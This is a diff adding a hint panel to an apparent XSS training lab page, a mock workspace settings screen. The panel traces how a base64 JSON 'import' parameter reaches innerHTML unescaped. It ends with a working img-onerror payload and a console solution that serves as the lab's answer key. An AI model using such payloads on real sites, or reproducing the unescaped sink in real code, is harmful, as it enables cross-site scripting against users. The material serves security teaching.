@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>WorkOS - Workspace Settings</title>
+  <link rel="stylesheet" href="/css/hint-panel.css">
   <style>
     *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:#f9fafb;color:#111827}
     .ws-nav{background:#fff;border-bottom:1px solid #e5e7eb;height:52px;display:flex;align-items:center;padding:0 20px;justify-content:space-between}.ws-nav .brand{font-weight:800;font-size:16px}.ws-nav .brand span{color:#6366f1}.ws-nav .links{display:flex;gap:20px;font-size:13px}.ws-nav .links a{color:#6b7280;text-decoration:none;font-weight:500}.ws-nav .links a:hover{color:#111827}.ws-nav .links a.active{color:#6366f1}.ws-nav .user-pill{background:#f3f4f6;padding:5px 14px 5px 8px;border-radius:20px;font-size:13px;font-weight:500;display:flex;align-items:center;gap:6px}.ws-nav .dot{width:7px;height:7px;border-radius:50%;background:#22c55e}
@@ -56,7 +57,84 @@
   -->
   <script src="/js/apps/settings-module.js"></script>
   <script>AppSettings.init('settings-content');</script>
+
+  <button class="stuck-btn" onclick="toggleHints()"><span class="q">💡</span> Stuck?</button>
+  <div class="hint-backdrop" id="hintBackdrop" onclick="toggleHints()"></div>
+  <div class="hint-panel" id="hintPanel">
+    <div class="hint-header">
+      <h2>Hint: WorkOS (Settings Import)</h2>
+      <button class="hint-close" onclick="toggleHints()">×</button>
+    </div>
+    <div class="hint-body">
+      <div class="hint-intro">The settings page supports "importing" a shared config via URL. Look for how <code>import</code> or <code>css</code> params flow into the DOM.</div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">1</div><span>Find applyParams</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Open <code>settings-module.js</code>. Look at <code>handleRouting</code> &mdash; it parses hash params in the form <code>#settings/appearance?css=...</code>. The <code>css</code> param goes straight into a <code>&lt;style&gt;</code> tag via <code>style.textContent</code> &mdash; NOT an XSS sink directly, but useful for CSS injection.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">2</div><span>The import flow</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <code>applyParams</code> also handles <code>import</code>, calling <code>showImportConfirmation(data)</code>. That function tries to base64-decode then JSON-parse the value, then builds HTML from the decoded object.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">3</div><span>Find the sink</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <pre><code>confirmDiv.innerHTML =
+  '...' +
+  (decoded.message ? '&lt;div class="import-message"&gt;' + decoded.message + '&lt;/div&gt;' : '') +
+  '...';</code></pre>
+          <code>decoded.message</code> is interpolated raw. The other fields (<code>JSON.stringify(decoded.settings)</code>) are escape-safe.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">4</div><span>Craft the import payload</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          You need a JSON object with a <code>settings</code> key (required by the if check) and a <code>message</code> with your XSS:
+          <pre><code>{
+  "settings": {"theme": "dark"},
+  "message": "&lt;img src=x onerror=alert(1)&gt;"
+}</code></pre>
+          Base64-encode this, then URL-encode and pass as <code>?import=...</code> or via hash <code>#settings/general?import=...</code>.
+        </div>
+      </div>
+
+      <div class="hint-spoiler">
+        <button class="hint-spoiler-btn" onclick="this.parentElement.classList.toggle('open')">🚩 Full Solution</button>
+        <div class="hint-spoiler-content">
+          <p>In DevTools console on any page:</p>
+          <pre>var payload = btoa(JSON.stringify({
+  settings: {theme:'dark'},
+  message: '&lt;img src=x onerror=alert("IMPORT_XSS")&gt;'
+}));
+location.href = '/labs/xss-hunt/hunt5-settings-import.html#settings/general?import=' + payload;</pre>
+          <p>Flow: hash params → <code>applyParams({import: ...})</code> → <code>showImportConfirmation</code> → base64 decode → JSON parse → builds HTML with <code>decoded.message</code> unescaped → img onerror fires.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
   <script src="/js/app.js"></script>
-  <script>setupLabVerification('xss-hunt-5', 'xss');</script>
+  <script>
+    setupLabVerification('xss-hunt-5', 'xss');
+    function toggleHints() {
+      document.getElementById('hintPanel').classList.toggle('open');
+      document.getElementById('hintBackdrop').classList.toggle('show');
+    }
+  </script>
 </body>
 </html>
